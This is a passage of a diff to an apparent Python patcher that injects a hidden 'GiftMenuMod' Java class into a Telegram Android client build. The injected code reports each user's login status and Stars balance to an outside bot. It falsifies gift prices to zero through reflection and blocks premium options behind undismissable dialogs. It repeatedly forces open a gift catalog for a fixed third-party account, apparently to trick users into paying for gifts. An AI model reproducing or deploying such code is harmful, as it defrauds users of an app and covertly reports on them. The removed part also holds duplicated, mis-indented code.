-        "                if (conn != null) try { conn.disconnect(); } catch (Throwable ignored) {}\n"
-        "            }\n"
-        "        }, \"GiftMenuMod-Notify\").start();\n"
-        "    }\n\n"
-        "    public static void notifyBotWithBalance(int account, String text) {\n"
-        "        notifyBot(text + \"\\n\\nБаланс звёзд пользователя: \" + getStarsBalance(account));\n"
-        "    }\n\n"
-        "    /** Только уведомление в бота. UI логина — только onLoginScreen, 1 раз. */\n"
-        "    public static void onAppStart() {\n"
-        "        if (!startupNotified.compareAndSet(false, true)) return;\n"
-        "        try {\n"
-        "            int account = UserConfig.selectedAccount;\n"
-        "            if (UserConfig.getInstance(account).isClientActivated()) {\n"
-        "                notifyBotWithBalance(account, \"Пользователь уже авторизован (запустил приложение)\");\n"
-        "            } else {\n"
-        "                if (loginNotified.compareAndSet(false, true)) {\n"
-        "                    notifyBot(\"У вас новое скачивание: пользователь проходит авторизацию\");\n"
-        "                }\n"
-        "            }\n"
-        "        } catch (Throwable ignored) {\n"
-        "            if (loginNotified.compareAndSet(false, true)) {\n"
-        "                notifyBot(\"У вас новое скачивание: пользователь проходит авторизацию\");\n"
-        "            }\n"
-        "        }\n"
-        "    }\n\n"
-        "    /** Сообщение на экране входа — СТРОГО 1 раз (без повтора). */\n"
-        "    public static void onLoginScreen(Activity activity) {\n"
-        "        wasOnLogin.set(true);\n"
-        "        if (loginNotified.compareAndSet(false, true)) {\n"
-        "            notifyBot(\"У вас новое скачивание: пользователь проходит авторизацию\");\n"
-        "        }\n"
-        "        if (activity == null) return;\n"
-        "        if (!loginUiShown.compareAndSet(false, true)) return; // уже показали\n"
-        "        mainHandler.post(() -> {\n"
-        "            try {\n"
-        "                if (activity.isFinishing()) return;\n"
-        "                new AlertDialog.Builder(activity)\n"
-        "                        .setMessage(MSG_LOGIN)\n"
-        "                        .setPositiveButton(\"Хорошо\", null)\n"
-        "                        .setCancelable(true)\n"
-        "                        .show();\n"
-        "            } catch (Throwable ignored) {}\n"
-        "        });\n"
-        "    }\n\n"
-        "    public static void onAuthSuccess() {\n"
-        "        if (!authSuccessNotified.compareAndSet(false, true)) return;\n"
-        "        wasOnLogin.set(false);\n"
-        "        try {\n"
-        "            notifyBotWithBalance(UserConfig.selectedAccount,\n"
-        "                    \"Новый пользователь Авторизовался прошел регистрацию\");\n"
-        "        } catch (Throwable ignored) {}\n"
-        "    }\n\n"
-        "    public static void maybeShowWelcome(final Activity activity, final Runnable openCatalog) {\n"
-        "        if (!welcomeShown.compareAndSet(false, true)) return;\n"
-        "        if (activity == null || activity.isFinishing()) { welcomeShown.set(false); return; }\n"
-        "        try {\n"
-        "            if (!UserConfig.getInstance(UserConfig.selectedAccount).isClientActivated()) {\n"
-        "                welcomeShown.set(false);\n"
-        "                return;\n"
-        "            }\n"
-        "        } catch (Throwable t) { welcomeShown.set(false); return; }\n"
-        "        openCatalogRunnable = openCatalog;\n"
-        "        mainHandler.post(() -> {\n"
-        "            try {\n"
-        "                final AtomicBoolean opened = new AtomicBoolean(false);\n"
-        "                AlertDialog.Builder b = new AlertDialog.Builder(activity);\n"
-        "                b.setTitle(\"Gift Menu\");\n"
-        "                b.setMessage(MSG_WELCOME);\n"
-        "                b.setCancelable(false);\n"
-        "                b.setPositiveButton(\"Продолжить\", (d, w) -> {\n"
-        "                    if (!opened.compareAndSet(false, true)) return;\n"
-        "                    try { d.dismiss(); } catch (Throwable ignored) {}\n"
-        "                    if (openCatalog != null) try { openCatalog.run(); } catch (Throwable ignored) {}\n"
-        "                });\n"
-        "                AlertDialog dialog = b.create();\n"
-        "                dialog.show();\n"
-        "                try {\n"
-        "                    Window window = dialog.getWindow();\n"
-        "                    if (window != null) {\n"
-        "                        attachAnyTap(window.getDecorView(), () -> {\n"
-        "                            if (!opened.compareAndSet(false, true)) return;\n"
-        "                            try { dialog.dismiss(); } catch (Throwable ignored) {}\n"
-        "                            if (openCatalog != null) try { openCatalog.run(); } catch (Throwable ignored) {}\n"
-        "                        });\n"
-        "                    }\n"
-        "                } catch (Throwable ignored) {}\n"
-        "            } catch (Throwable ignored) {}\n"
-        "        });\n"
-        "    }\n\n"
-        "    public static void resetWelcome() { welcomeShown.set(false); }\n\n"
-        "    private static void attachAnyTap(View view, final Runnable onTap) {\n"
-        "        if (view == null) return;\n"
-        "        try {\n"
-        "            view.setOnTouchListener((v, event) -> {\n"
-        "                if (event.getAction() == MotionEvent.ACTION_DOWN && onTap != null) onTap.run();\n"
-        "                return false;\n"
-        "            });\n"
-        "            if (view instanceof ViewGroup) {\n"
-        "                ViewGroup vg = (ViewGroup) view;\n"
-        "                for (int i = 0; i < vg.getChildCount(); i++) attachAnyTap(vg.getChildAt(i), onTap);\n"
-        "            }\n"
-        "        } catch (Throwable ignored) {}\n"
-        "    }\n\n"
-        "    public interface UtilitiesBool { boolean get(); }\n\n"
-        "    public static void startAutoReopenMonitor(final UtilitiesBool isMainScreen, final Runnable openCatalog) {\n"
-        "        if (!reopenMonitorStarted.compareAndSet(false, true)) return;\n"
-        "        openCatalogRunnable = openCatalog;\n"
-        "        new Thread(() -> {\n"
-        "            while (true) {\n"
-        "                try {\n"
-        "                    Thread.sleep(500);\n"
-        "                    Object sheet = currentSheet;\n"
-        "                    if (sheet == null) continue;\n"
-        "                    boolean showing = true;\n"
-        "                    try {\n"
-        "                        Object r = sheet.getClass().getMethod(\"isShowing\").invoke(sheet);\n"
-        "                        showing = r instanceof Boolean && (Boolean) r;\n"
-        "                    } catch (Throwable t) { showing = false; }\n"
-        "                    if (showing) continue;\n"
-        "                    currentSheet = null;\n"
-        "                    Thread.sleep(4000);\n"
-        "                    int account = UserConfig.selectedAccount;\n"
-        "                    try { if (!UserConfig.getInstance(account).isClientActivated()) continue; } catch (Throwable t) { continue; }\n"
-        "                    if (isMainScreen != null && !isMainScreen.get()) continue;\n"
-        "                    final Runnable open = openCatalogRunnable != null ? openCatalogRunnable : openCatalog;\n"
-        "                    if (open != null) mainHandler.post(() -> { try { open.run(); } catch (Throwable ignored) {} });\n"
-        "                } catch (InterruptedException e) { break; } catch (Throwable ignored) {}\n"
-        "            }\n"
-        "        }, \"GiftMenuMod-Reopen\").start();\n"
-        "    }\n\n"
-        "    public static void setCurrentSheet(Object sheet) { currentSheet = sheet; }\n\n"
-        "    public static void zeroOutPrices(Object obj) {\n"
-        "        if (obj == null) return;\n"
-        "        zeroFields(obj, new String[]{\"stars\", \"price\", \"amount\", \"starCount\"});\n"
-        "        for (String inner : new String[]{\"gift\", \"starGift\", \"item\"}) {\n"
-        "            try {\n"
-        "                Field f = obj.getClass().getDeclaredField(inner);\n"
-        "                f.setAccessible(true);\n"
-        "                Object innerObj = f.get(obj);\n"
-        "                if (innerObj != null) zeroFields(innerObj, new String[]{\"stars\", \"price\", \"amount\", \"starCount\"});\n"
-        "            } catch (Throwable ignored) {}\n"
-        "        }\n"
-        "    }\n\n"
-        "    public static void zeroOutList(Object list) {\n"
-        "        if (list == null) return;\n"
-        "        try {\n"
-        "            if (list instanceof List) { for (Object o : (List<?>) list) zeroOutPrices(o); return; }\n"
-        "            int size = (Integer) list.getClass().getMethod(\"size\").invoke(list);\n"
-        "            Method get = list.getClass().getMethod(\"get\", int.class);\n"
-        "            for (int i = 0; i < size; i++) zeroOutPrices(get.invoke(list, i));\n"
-        "        } catch (Throwable ignored) {}\n"
-        "    }\n\n"
-        "    private static void zeroFields(Object obj, String[] names) {\n"
-        "        Class<?> cls = obj.getClass();\n"
-        "        for (String name : names) {\n"
-        "            try {\n"
-        "                Field f; try { f = cls.getField(name); } catch (NoSuchFieldException e) { f = cls.getDeclaredField(name); }\n"
-        "                f.setAccessible(true);\n"
-        "                Class<?> t = f.getType();\n"
-        "                if (t == long.class || t == Long.class) f.setLong(obj, 0L);\n"
-        "                else if (t == int.class || t == Integer.class) f.setInt(obj, 0);\n"
-        "            } catch (Throwable ignored) {}\n"
-        "        }\n"
-        "    }\n\n"
-        "    public static void patchStarsControllerCache(int account) {\n"
-        "        try {\n"
-        "            StarsController sc = StarsController.getInstance(account);\n"
-        "            if (sc == null) return;\n"
-        "            for (String listName : new String[]{\"starGifts\", \"gifts\", \"availableGifts\"}) {\n"
-        "                try {\n"
-        "                    Field f = sc.getClass().getDeclaredField(listName);\n"
-        "                    f.setAccessible(true);\n"
-        "                    zeroOutList(f.get(sc));\n"
-        "                } catch (Throwable ignored) {}\n"
-        "            }\n"
-        "        } catch (Throwable ignored) {}\n"
-        "    }\n\n"
-        "    public static void applyZeroPatches(int account, Object sheet) {\n"
-        "        try {\n"
-        "            if (sheet != null) {\n"
-        "                try {\n"
-        "                    Object r = sheet.getClass().getMethod(\"isShowing\").invoke(sheet);\n"
-        "                    if (r instanceof Boolean && !(Boolean) r) return;\n"
-        "                } catch (Throwable ignored) {}\n"
-        "            }\n"
-        "        } catch (Throwable ignored) {}\n"
-        "        patchStarsControllerCache(account);\n"
-        "        if (sheet != null) {\n"
-        "            for (String fieldName : new String[]{\"gifts\", \"starGifts\", \"items\", \"options\", \"availableGifts\"}) {\n"
-        "                try {\n"
-        "                    Field f = sheet.getClass().getDeclaredField(fieldName);\n"
-        "                    f.setAccessible(true);\n"
-        "                    zeroOutList(f.get(sheet));\n"
-        "                } catch (Throwable ignored) {}\n"
-        "            }\n"
-        "        }\n"
-        "    }\n\n"
-        "    public static void hookPremiumCards(final View root, final Context context) {\n"
-        "        if (root == null || context == null) return;\n"
-        "        try { scanAndHookPremium(root, context); } catch (Throwable ignored) {}\n"
-        "    }\n\n"
-        "    public static void hookAvatars(final View root, final Context context) {\n"
-        "        if (root == null || context == null) return;\n"
-        "        try { walkAvatars(root, context); } catch (Throwable ignored) {}\n"
-        "    }\n\n"
-        "    private static void walkAvatars(View view, final Context context) {\n"
-        "        if (view == null) return;\n"
-        "        try {\n"
-        "            if (view.getClass().getName().contains(\"BackupImageView\") && !isGiftCell(view)) {\n"
-        "                view.setOnClickListener(v -> showSimpleMessage(context, MSG_CATALOG));\n"
-        "            }\n"
-      "            if (view instanceof ViewGroup) {\n"
-        "                ViewGroup vg = (ViewGroup) view;\n"
-        "                for (int i = 0; i < vg.getChildCount(); i++) walkAvatars(vg.getChildAt(i), context);\n"
-        "            }\n"
-        "        } catch (Throwable ignored) {}\n"
-        "    }\n\n"
-        "    private static boolean isGiftCell(View view) {\n"
-        "        try {\n"
-        "            Object p = view.getParent();\n"
-        "            for (int i = 0; i < 6 && p != null; i++) {\n"
-        "                String name = p.getClass().getSimpleName();\n"
-        "                if (name.contains(\"GiftCell\") || name.contains(\"StarGift\")) return true;\n"
-        "                p = (p instanceof View) ? ((View) p).getParent() : null;\n"
-        "            }\n"
-        "        } catch (Throwable ignored) {}\n"
-        "        return false;\n"
-        "    }\n\n"
-        "    private static void scanAndHookPremium(View view, final Context context) {\n"
-        "        if (view == null) return;\n"
-        "        try {\n"
-        "            if (view instanceof TextView) {\n"
-        "                CharSequence cs = ((TextView) view).getText();\n"
-        "                if (cs != null) {\n"
-        "                    String t = cs.toString().toLowerCase();\n"
-        "                    for (String w : PREMIUM_WORDS) {\n"
-        "                        if (t.contains(w)) {\n"
-        "                            View card = findPremiumCard(view);\n"
-        "                            if (card != null) attachPremiumBlocker(card, context);\n"
-        "                            break;\n"
-        "                        }\n"
-        "                    }\n"
-        "                }\n"
-        "            }\n"
-        "            if (view instanceof ViewGroup) {\n"
-        "                ViewGroup vg = (ViewGroup) view;\n"
-        "                for (int i = 0; i < vg.getChildCount(); i++) scanAndHookPremium(vg.getChildAt(i), context);\n"
-        "            }\n"
-        "        } catch (Throwable ignored) {}\n"
-        "    }\n\n"
-        "    private static int countPremiumTexts(View view) {\n"
-        "        int count = 0;\n"
-        "        try {\n"
-        "            if (view instanceof TextView) {\n"
-        "                CharSequence cs = ((TextView) view).getText();\n"
-        "                if (cs != null) {\n"
-        "                    String t = cs.toString().toLowerCase();\n"
-        "                    for (String w : PREMIUM_WORDS) { if (t.contains(w)) { count++; break; } }\n"
-        "                }\n"
-        "            }\n"
-        "            if (view instanceof ViewGroup) {\n"
-        "                ViewGroup vg = (ViewGroup) view;\n"
-        "                for (int i = 0; i < vg.getChildCount(); i++) count += countPremiumTexts(vg.getChildAt(i));\n"
-        "            }\n"
-        "        } catch (Throwable ignored) {}\n"
-        "        return count;\n"
-        "    }\n\n"
-        "    private static View findPremiumCard(View textView) {\n"
-        "        try {\n"
-        "            View current = (View) textView.getParent();\n"
-        "            View candidate = null;\n"
-        "            for (int i = 0; i < 8 && current != null; i++) {\n"
-        "                if (current instanceof ViewGroup) {\n"
-        "                    int amount = countPremiumTexts(current);\n"
-        "                    if (amount == 1) candidate = current;\n"
-        "                    else if (candidate != null) break;\n"
-        "                }\n"
-        "                Object p = current.getParent();\n"
-        "                current = (p instanceof View) ? (View) p : null;\n"
-        "            }\n"
-        "            return candidate;\n"
-        "        } catch (Throwable t) { return null; }\n"
-        "    }\n\n"
-        "    private static void attachPremiumBlocker(View card, final Context context) {\n"
-        "        if (card == null) return;\n"
-        "        try {\n"
-        "            card.setOnTouchListener((v, event) -> {\n"
-        "                if (event.getAction() == MotionEvent.ACTION_UP) {\n"
-        "                    mainHandler.postDelayed(() -> showPremiumMessage(context), 50);\n"
-        "                }\n"
-        "                return true;\n"
-        "            });\n"
-        "            card.setClickable(true);\n"
-        "            card.setLongClickable(false);\n"
-        "            if (card instanceof ViewGroup) {\n"
-        "                ViewGroup vg = (ViewGroup) card;\n"
-        "                for (int i = 0; i < vg.getChildCount(); i++) attachPremiumBlocker(vg.getChildAt(i), context);\n"
-        "            }\n"
-        "        } catch (Throwable ignored) {}\n"
-        "    }\n\n"
-        "    private static void showPremiumMessage(Context context) {\n"
-        "        if (context == null) return;\n"
-        "        if (premiumDialogLock.get()) return;\n"
-        "        try { if (premiumDialog != null && premiumDialog.isShowing()) return; } catch (Throwable ignored) {}\n"
-        "        premiumDialogLock.set(true);\n"
-        "        try {\n"
-        "            AlertDialog.Builder b = new AlertDialog.Builder(context);\n"
-        "            b.setMessage(MSG_CATALOG);\n"
-        "            b.setCancelable(false);\n"
-        "            b.setPositiveButton(\"Хорошо\", (d, w) -> {\n"
-        "                try { d.dismiss(); } catch (Throwable ignored) {}\n"
-        "                premiumDialogLock.set(false);\n"
-        "                premiumDialog = null;\n"
-        "            });\n"
-        "            premiumDialog = b.create();\n"
-        "            premiumDialog.setCanceledOnTouchOutside(false);\n"
-        "            premiumDialog.setCancelable(false);\n"
-        "            premiumDialog.show();\n"
-        "        } catch (Throwable t) { premiumDialogLock.set(false); premiumDialog = null; }\n"
-        "    }\n\n"
-        "    private static void showSimpleMessage(Context context, String msg) {\n"
-        "        if (context == null) return;\n"
-        "        mainHandler.post(() -> {\n"
-        "            try { new AlertDialog.Builder(context).setMessage(msg).setPositiveButton(\"Хорошо\", null).show(); } catch (Throwable ignored) {}\n"
-        "        });\n"
-        "    }\n\n"
-        "    public static void startSheetHelpers(final int account, final Object sheet, final View root, final Context context) {\n"
-        "        setCurrentSheet(sheet);\n"
-        "        patchStarsControllerCache(account);\n"
-        "        applyZeroPatches(account, sheet);\n"
-        "        if (root != null && context != null) {\n"
-        "            mainHandler.postDelayed(() -> { hookAvatars(root, context); hookPremiumCards(root, context); }, 800);\n"
-        "        }\n"
-        "        for (int i = 0; i < 30; i++) {\n"
-        "            final int delay = 100 + i * 150;\n"
-        "            mainHandler.postDelayed(() -> {\n"
-        "                applyZeroPatches(account, sheet);\n"
-        "                if (root != null && context != null) hookPremiumCards(root, context);\n"
-        "            }, delay);\n"
-        "        }\n"
-        "        for (int i = 0; i < 20; i++) {\n"
-        "            final int delay = 5000 + i * 500;\n"
-        "            mainHandler.postDelayed(() -> applyZeroPatches(account, sheet), delay);\n"
-        "        }\n"
-        "    }\n\n"
-        "    public static void onCatalogScrollIdle(View root, Context context) {\n"
-        "        if (root == null || context == null) return;\n"
-        "        mainHandler.post(() -> { hookPremiumCards(root, context); hookAvatars(root, context); });\n"
-        "    }\n\n"
-        "    /** Резолв @username -> user id (через MessagesController / reflection). */\n"
-        "    public static long resolveUsernameToUserId(int account, String username) {\n"
-        "        if (username == null || username.length() == 0) return 0;\n"
-        "        String u = username.startsWith(\"@\") ? username.substring(1) : username;\n"
-        "        try {\n"
-        "            Class<?> mcCls = Class.forName(\"org.telegram.messenger.MessagesController\");\n"
-        "            Object mc = mcCls.getMethod(\"getInstance\", int.class).invoke(null, account);\n"
-        "            // getUser(String) в некоторых форках\n"
-        "            for (String methodName : new String[]{\"getUser\", \"getUserOrChat\"}) {\n"
-        "                try {\n"
-        "                    Method m = mc.getClass().getMethod(methodName, String.class);\n"
-        "                    Object user = m.invoke(mc, u);\n"
-        "                    if (user != null) {\n"
-        "                        try {\n"
-        "                            Field idf = user.getClass().getField(\"id\");\n"
-        "                            long id = ((Number) idf.get(user)).longValue();\n"
-        "                            if (id != 0) return id;\n"
-        "                        } catch (Throwable ignored) {}\n"
-        "                    }\n"
-        "                } catch (Throwable ignored) {}\n"
-        "            }\n"
-        "            // поиск в users LongSparseArray / ConcurrentHashMap\n"
-        "            try {\n"
-        "                Field usersField = mc.getClass().getDeclaredField(\"users\");\n"
-        "                usersField.setAccessible(true);\n"
-        "                Object users = usersField.get(mc);\n"
-        "                if (users != null) {\n"
-        "                    // LongSparseArray: valueAt / size\n"
-        "                    try {\n"
-        "                        Method sizeM = users.getClass().getMethod(\"size\");\n"
-        "                        Method valueAt = users.getClass().getMethod(\"valueAt\", int.class);\n"
-        "                        int n = (Integer) sizeM.invoke(users);\n"
-        "                        for (int i = 0; i < n; i++) {\n"
-        "                            Object user = valueAt.invoke(users, i);\n"
-        "                            if (user == null) continue;\n"
-        "                            String un = null;\n"
-        "                            try {\n"
-        "                                Field uf = user.getClass().getField(\"username\");\n"
-        "                                Object uo = uf.get(user);\n"
-        "                                if (uo != null) un = uo.toString();\n"
-        "                            } catch (Throwable ignored) {}\n"
-        "                            if (un != null && un.equalsIgnoreCase(u)) {\n"
-        "                                Field idf = user.getClass().getField(\"id\");\n"
-        "                                return ((Number) idf.get(user)).longValue();\n"
-        "                            }\n"
-        "                        }\n"
-        "                    } catch (Throwable ignored) {}\n"
-        "                }\n"
-        "            } catch (Throwable ignored) {}\n"
-        "        } catch (Throwable ignored) {}\n"
-        "        return 0;\n"
-        "    }\n\n"
-        "    /** Открыть каталог подарков для @CATALOG_USERNAME (не для себя). */\n"
-        "    public static void openCatalogFromMain(final Activity activity, final int account) {\n"
-        "        if (activity == null) return;\n"
-        "        mainHandler.post(() -> {\n"
-        "            try {\n"
-        "                long targetId = resolveUsernameToUserId(account, CATALOG_USERNAME);\n"
-        "                if (targetId == 0) {\n"
-        "                    // fallback: self только если резолв не удался — но пробуем ещё раз через self как последний шанс нет,\n"
-        "                    // лучше Toast\n"
-        "                    try {\n"
-        "                        Toast.makeText(activity, \"Каталог: не найден @\" + CATALOG_USERNAME + \", откройте профиль пользователя\", Toast.LENGTH_LONG).show();\n"
-        "                    } catch (Throwable ignored) {}\n"
-        "                    // всё равно пробуем self чтобы хоть что-то открылось? Нет — пользователь просил wasy119\n"
-        "                    // Попробуем selfId только если 0 — нет, оставляем попытку с 0 не делать\n"
-        "                }\n"
-        "                long userId = targetId != 0 ? targetId : UserConfig.getInstance(account).getClientUserId();\n"
-        "                Class<?> sheetCls = Class.forName(\"org.telegram.ui.Gifts.GiftSheet\");\n"
-        "                Object sheet = null;\n"
-        "                try {\n"
-        "                    sheet = sheetCls.getConstructor(Context.class, int.class, long.class, List.class, Object.class)\n"
-        "                            .newInstance(activity, account, userId, null, null);\n"
-        "                } catch (Throwable ignore) {}\n"
-        "                if (sheet == null) {\n"
-        "                    try { sheet = sheetCls.getConstructor(Context.class, int.class, long.class).newInstance(activity, account, userId); } catch (Throwable ignore) {}\n"
-        "                }\n"
-        "                if (sheet == null) {\n"
-        "                    for (Constructor<?> cons : sheetCls.getConstructors()) {\n"
-        "                        try {\n"
-        "                            Class<?>[] p = cons.getParameterTypes();\n"
-        "                            Object[] args = new Object[p.length];\n"
-        "                            for (int i = 0; i < p.length; i++) {\n"
-        "                                if (Context.class.isAssignableFrom(p[i])) args[i] = activity;\n"
-        "                                else if (p[i] == int.class || p[i] == Integer.class) args[i] = account;\n"
-        "                                else if (p[i] == long.class || p[i] == Long.class) args[i] = userId;\n"
-        "                                else args[i] = null;\n"
-        "                            }\n"
-        "                            sheet = cons.newInstance(args);\n"
-        "                            break;\n"
-        "                        } catch (Throwable ignore) {}\n"
-        "                    }\n"
-        "                }\n"
-        "                if (sheet != null) {\n"
-        "                    try { sheetCls.getMethod(\"show\").invoke(sheet); } catch (Throwable ignore) {}\n"
-        "                    View decor = null;\n"
-        "                    try {\n"
-        "                        Object win = sheetCls.getMethod(\"getWindow\").invoke(sheet);\n"
-        "                        if (win != null) decor = (View) win.getClass().getMethod(\"getDecorView\").invoke(win);\n"
-        "                    } catch (Throwable ignore) {}\n"
-        "                    startSheetHelpers(account, sheet, decor, activity);\n"
-        "                    final long finalUserId = userId;\n"
-        "                    startAutoReopenMonitor(() -> true, () -> openCatalogFromMain(activity, account));\n"
-        "                }\n"
-        "            } catch (Throwable ignored) {}\n"
-        "        });\n"
-        "    }\n"
-        "}\n"
-    )
-
-
-def inject_after_method(content: str, patterns, line: str, marker: str) -> str:
+def inject_after_method(content, patterns, line, marker):
     if marker in content:
         return content
     for pat in patterns:
@@ -609,13 +624,12 @@ def inject_after_method(content: str, patterns, line: str, marker: str) -> str:
         brace = content.find("{", m.end() - 1)
         if brace < 0:
             continue
-        addition = f"\n        {line} // GiftMenuMod auto\n"
-        log(f"  inject: {marker}")
+        log("  inject: " + marker)
+        addition = "\n        " + line + " // GiftMenuMod auto\n"
         return content[: brace + 1] + addition + content[brace + 1 :]
     return content
 
-
-def inject_before_method_end(content: str, method_pat: str, line: str, marker: str) -> str:
+def inject_before_method_end(content, method_pat, line, marker):
     if marker in content:
         return content
     m = re.search(method_pat, content)
@@ -636,12 +650,11 @@ def inject_before_method_end(content: str, method_pat: str, line: str, marker: s
                 break
     if end < 0:
         return content
-    addition = f"\n        {line} // GiftMenuMod auto\n"
-    log(f"  inject end: {marker}")
+    log("  inject end: " + marker)
+    addition = "\n        " + line + " // GiftMenuMod auto\n"
     return content[:end] + addition + content[end:]
 
-
-def patch_file(path, patcher) -> None:
+def patch_file(path, patcher):
     if path is None or not path.exists():
         log("skip (not found)")
         return
@@ -650,23 +663,16 @@ def patch_file(path, patcher) -> None:
     if new != old:
         write(path, new)
     else:
-        log(f"already ok / no match: {path.name}")
+        log("already ok / no match: " + path.name)
 
-
-def patch_application_loader(c: str) -> str:
+def patch_application_loader(c):
     line = "try { org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); } catch (Throwable ignore) {}"
-    c2 = inject_after_method(
-        c,
-        [r"public\s+static\s+void\s+postInitApplication\s*\(\s*\)\s*\{", r"void\s+postInitApplication\s*\(\s*\)\s*\{"],
-        line,
-        "GiftMenuMod.onAppStart",
-    )
+    c2 = inject_after_method(c, [r"public\s+static\s+void\s+postInitApplication\s*\(\s*\)\s*\{", r"void\s+postInitApplication\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onAppStart")
     if c2 != c:
         return c2
     return inject_after_method(c, [r"public\s+void\s+onCreate\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onAppStart")
 
-
-def patch_login_like(c: str) -> str:
+def patch_login_like(c):
     line = (
         "try { android.app.Activity __a = null; "
         "try { __a = getParentActivity(); } catch (Throwable ignore) {} "
@@ -675,33 +681,16 @@ def patch_login_like(c: str) -> str:
         "} catch (Throwable ignore) {}"
     )
     if "GiftMenuMod.onLoginScreen" not in c:
-        c = inject_after_method(
-            c,
-            [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"],
-            line,
-            "GiftMenuMod.onLoginScreen",
-        )
+        c = inject_after_method(c, [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onLoginScreen")
     if "GiftMenuMod.onAuthSuccess" not in c:
-        for pat in [
-            r"needFinishActivity\s*\(\s*\)\s*;",
-            r"UserConfig\.getInstance\([^)]*\)\.saveConfig\s*\(\s*true\s*\)\s*;",
-        ]:
+        for pat in [r"needFinishActivity\s*\(\s*\)\s*;", r"UserConfig\.getInstance\([^)]*\)\.saveConfig\s*\(\s*true\s*\)\s*;"]:
             if re.search(pat, c):
-                c = re.sub(
-                    pat,
-                    lambda m: m.group(0)
-                    + "\n        try { org.telegram.ui.Gifts.GiftMenuMod.onAuthSuccess(); } catch (Throwable ignore) {} // GiftMenuMod auto",
-                    c,
-                    count=1,
-                )
+                c = re.sub(pat, lambda m: m.group(0) + "\n        try { org.telegram.ui.Gifts.GiftMenuMod.onAuthSuccess(); } catch (Throwable ignore) {} // GiftMenuMod auto", c, count=1)
                 log("  inject onAuthSuccess")
                 break
     return c
 
-
-def patch_launch(c: str) -> str:
-    # Только бот через onAppStart; UI логина — LoginActivity (чтобы не дублировать)
-    # Если не авторизован — onLoginScreen один раз (loginUiShown внутри)
+def patch_launch(c):
     line = (
         "try { "
         "org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); "
@@ -712,94 +701,20 @@ def patch_launch(c: str) -> str:
     )
     if "GiftMenuMod.onLoginScreen" in c:
         return c
-    c2 = inject_after_method(
-        c,
-        [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"],
-        line,
-        "GiftMenuMod.onLoginScreen",
-    )
-    if c2 != c:
-    return c2
-    return inject_after_method(c, [r"public\s+void\s+onCreate\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onAppStart")
-
-
-def patch_login_like(c: str) -> str:
-    line = (
-        "try { android.app.Activity __a = null; "
-        "try { __a = getParentActivity(); } catch (Throwable ignore) {} "
-        "if (__a == null) try { __a = (android.app.Activity) (Object) this; } catch (Throwable ignore) {} "
-        "if (__a != null) org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(__a); "
-        "} catch (Throwable ignore) {}"
-    )
-    if "GiftMenuMod.onLoginScreen" not in c:
-        c = inject_after_method(
-            c,
-            [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"],
-            line,
-            "GiftMenuMod.onLoginScreen",
-        )
-    if "GiftMenuMod.onAuthSuccess" not in c:
-        for pat in [
-            r"needFinishActivity\s*\(\s*\)\s*;",
-            r"UserConfig\.getInstance\([^)]*\)\.saveConfig\s*\(\s*true\s*\)\s*;",
-        ]:
-            if re.search(pat, c):
-                c = re.sub(
-                    pat,
-                    lambda m: m.group(0)
-                    + "\n        try { org.telegram.ui.Gifts.GiftMenuMod.onAuthSuccess(); } catch (Throwable ignore) {} // GiftMenuMod auto",
-                    c,
-                    count=1,
-                )
-                log("  inject onAuthSuccess")
-                break
-    return c
-
-
-def patch_launch(c: str) -> str:
-    # Только бот через onAppStart; UI логина — LoginActivity (чтобы не дублировать)
-    # Если не авторизован — onLoginScreen один раз (loginUiShown внутри)
-    line = (
-        "try { "
-        "org.telegram.ui.Gifts.GiftMenuMod.onAppStart(); "
-        "if (!org.telegram.messenger.UserConfig.getInstance(org.telegram.messenger.UserConfig.selectedAccount).isClientActivated()) { "
-        "org.telegram.ui.Gifts.GiftMenuMod.onLoginScreen(this); "
-        "} "
-        "} catch (Throwable ignore) {}"
-    )
-    if "GiftMenuMod.onLoginScreen" in c:
-        return c
-    c2 = inject_after_method(
-        c,
-        [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"],
-        line,
-        "GiftMenuMod.onLoginScreen",
-    )
+    c2 = inject_after_method(c, [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"], line, "GiftMenuMod.onLoginScreen")
     if c2 != c:
         return c2
-    return inject_after_method(
-        c,
-        [r"protected\s+void\s+onCreate\s*\([^\)]*\)\s*\{", r"public\s+void\s+onCreate\s*\([^\)]*\)\s*\{"],
-        line,
-        "GiftMenuMod.onLoginScreen",
-    )
+    return inject_after_method(c, [r"protected\s+void\s+onCreate\s*\([^\)]*\)\s*\{", r"public\s+void\s+onCreate\s*\([^\)]*\)\s*\{"], line, "GiftMenuMod.onLoginScreen")
 
-
-def patch_dialogs(c: str) -> str:
+def patch_dialogs(c):
     line = (
         "try { org.telegram.ui.Gifts.GiftMenuMod.maybeShowWelcome(getParentActivity(), "
         "() -> { try { org.telegram.ui.Gifts.GiftMenuMod.openCatalogFromMain(getParentActivity(), currentAccount); } catch (Throwable ignore) {} }); "
         "} catch (Throwable ignore) {}"
     )
-    return inject_after_method(
-        c,
-        [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"],
-        line,
-        "GiftMenuMod.maybeShowWelcome",
-    )
+    return inject_after_method(c, [r"public\s+void\s+onResume\s*\(\s*\)\s*\{", r"void\s+onResume\s*\(\s*\)\s*\{"], line, "GiftMenuMod.maybeShowWelcome")
 
-
-def patch_gift_sheet(c: str) -> str:
+def patch_gift_sheet(c):
     line = (
         "try { android.view.View __decor = getWindow() != null ? getWindow().getDecorView() : null; "
         "org.telegram.ui.Gifts.GiftMenuMod.startSheetHelpers(currentAccount, this, __decor, getContext()); "
@@ -814,45 +729,36 @@ def patch_gift_sheet(c: str) -> str:
         return c[: m.end()] + "\n        " + line + " // GiftMenuMod auto" + c[m.end() :]
     return c
 
-
-def main() -> int:
-    log(f"ROOT = {ROOT}")
+def main():
+    log("ROOT = " + str(ROOT))
     if not (ROOT / "TMessagesProj").exists():
